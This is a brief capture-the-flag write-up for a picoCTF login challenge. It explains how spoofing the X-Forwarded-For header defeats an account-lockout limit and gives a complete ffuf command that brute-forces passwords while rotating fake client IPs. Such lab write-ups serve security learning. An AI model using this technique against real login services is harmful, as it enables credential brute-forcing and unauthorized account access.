# URL
https://play.picoctf.org/practice/challenge/521
# Concept
* bypassing brute-force restrictions
* using the `X-Forwarded-For` header
# Method of solve
* we're given a password list and a username, but we notice that the app locks your app after two incorrect login attempts
* we need to bypass the rate-limiting, and we can do that with the `X-Forwarded-For` header
* we can use `FFuF` to fuzz the app and perform the brute force attack
* FFuF command
```
ffuf -X POST -d '{"email":"ctf-player@picoctf.org","password":"FUZZ2"}' -H "Content-Type: application/json" -H "X-Forwarded-For: 127.FUZZ1.1.1" -u http://amiable-citadel.picoctf.net:62495/login -w ./passwords.txt:FUZZ2 -w ./numbers.txt:FUZZ1 -mc all -mode pitchfork
```

